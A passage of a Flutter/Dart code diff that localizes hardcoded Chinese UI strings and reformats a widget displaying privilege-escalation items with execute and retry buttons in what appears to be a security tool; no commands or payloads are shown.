   @override
   Widget build(BuildContext context) {
     final hasResult = result != null;
-    final isError = result?.startsWith('[错误]') == true;
-    final isNoOutput = result == '(无输出)';
+    final isError = result?.startsWith(S.logErrorTag) == true;
+    final isNoOutput = result == S.noOutput;
 
     return Container(
       margin: const EdgeInsets.only(bottom: 8),
@@ -1172,8 +1242,8 @@ class _PrivEscItemWidget extends StatelessWidget {
         border: Border.all(
           color: hasResult
               ? (isError
-                  ? AppColors.red.withValues(alpha: 0.4)
-                  : color.withValues(alpha: 0.3))
+                    ? AppColors.red.withValues(alpha: 0.4)
+                    : color.withValues(alpha: 0.3))
               : AppColors.border,
         ),
       ),
@@ -1181,8 +1251,7 @@ class _PrivEscItemWidget extends StatelessWidget {
         crossAxisAlignment: CrossAxisAlignment.start,
         children: [
           Padding(
-            padding:
-                const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
+            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
             child: Row(
               crossAxisAlignment: CrossAxisAlignment.start,
               children: [
@@ -1193,18 +1262,24 @@ class _PrivEscItemWidget extends StatelessWidget {
                       Text(
                         item.name,
                         style: AppTextStyles.body(
-                            size: 13, color: AppColors.textPrimary),
+                          size: 13,
+                          color: AppColors.textPrimary,
+                        ),
                       ),
                       const SizedBox(height: 2),
                       Text(
                         item.description,
                         style: AppTextStyles.caption(
-                            size: 11, color: AppColors.textMuted),
+                          size: 11,
+                          color: AppColors.textMuted,
+                        ),
                       ),
                       const SizedBox(height: 5),
                       Container(
                         padding: const EdgeInsets.symmetric(
-                            horizontal: 6, vertical: 3),
+                          horizontal: 6,
+                          vertical: 3,
+                        ),
                         decoration: BoxDecoration(
                           color: AppColors.bgDark,
                           borderRadius: BorderRadius.circular(4),
@@ -1215,10 +1290,7 @@ class _PrivEscItemWidget extends StatelessWidget {
                               : item.command,
                           style: const TextStyle(
                             fontFamily: 'Monaco',
-                            fontFamilyFallback: [
-                              'Courier New',
-                              'monospace'
-                            ],
+                            fontFamilyFallback: ['Courier New', 'monospace'],
                             fontSize: 10.5,
                             color: AppColors.textSecondary,
                           ),
@@ -1247,16 +1319,19 @@ class _PrivEscItemWidget extends StatelessWidget {
                           style: OutlinedButton.styleFrom(
                             foregroundColor: color,
                             side: BorderSide(
-                                color: color.withValues(alpha: 0.6)),
+                              color: color.withValues(alpha: 0.6),
+                            ),
                             padding: EdgeInsets.zero,
                             shape: RoundedRectangleBorder(
                               borderRadius: BorderRadius.circular(6),
                             ),
                           ),
                           child: Text(
-                            hasResult ? '重试' : '执行',
+                            hasResult ? S.btnRetry : S.btnExecute,
                             style: AppTextStyles.caption(
-                                size: 11, color: color),
+                              size: 11,
+                              color: color,
+                            ),
                           ),
                         ),
                 ),
@@ -1284,7 +1359,7 @@ class _PrivEscItemWidget extends StatelessWidget {
               ),
               padding: const EdgeInsets.all(10),
               child: SelectableText(
-                result!,
+                isNoOutput ? S.noOutput : result!,
                 style: TextStyle(
                   fontFamily: 'Monaco',
                   fontFamilyFallback: const ['Courier New', 'monospace'],
@@ -1293,8 +1368,8 @@ class _PrivEscItemWidget extends StatelessWidget {
                   color: isError
                       ? AppColors.red
                       : (isNoOutput
-                          ? AppColors.textMuted
-                          : const Color(0xFFB8C0CC)),
+                            ? AppColors.textMuted
+                            : const Color(0xFFB8C0CC)),
                 ),
               ),
             ),
